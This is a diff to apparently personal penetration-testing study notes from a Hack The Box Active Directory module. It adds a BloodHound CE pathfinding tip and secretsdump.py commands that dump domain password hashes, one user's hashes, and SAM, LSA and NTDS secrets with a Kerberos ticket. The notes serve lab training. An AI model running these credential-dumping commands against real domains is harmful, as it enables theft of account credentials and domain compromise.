@@ -193,6 +193,8 @@ If we right-click on the line between the two objects, a menu will pop up. If we
 
 We'll dig into this menu more later on.
 
+**in bloodhound ce :** click se as starting node and select teh end node 
+![[Pasted image 20260126051217.png]]
 #### Investigating ForceChangePassword Further
 
 ![Popup window in BloodHound showing ForceChangePassword capability for WLEY@INLANEFREIGHT.LOCAL to change DAMUNDSEN@INLANEFREIGHT.LOCAL's password without knowing the current password.](https://academy.hackthebox.com/storage/modules/143/help_edge.png)
@@ -474,6 +476,11 @@ secretsdump.py -outputfile hashes_list -just-dc <DOMAIN>/<USER-3>:<PASS>@<DC-IP>
 # with TGT ticket 
 export KRB5CCNAME=hacker.ccache 
 secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC-IP> -just-dc -outputfile hashes_list # -k → Use Kerberos authentication (ticket from KRB5CCNAME)
+
+# spesific user dump
+secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC-IP> -just-dc-user ahmed 
+# dump all SAM + LSA + NTDS
+secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC-IP> 
 
 # Listing Hashes, Kerberos Keys, and Cleartext Passwords
 ls hashes_list*
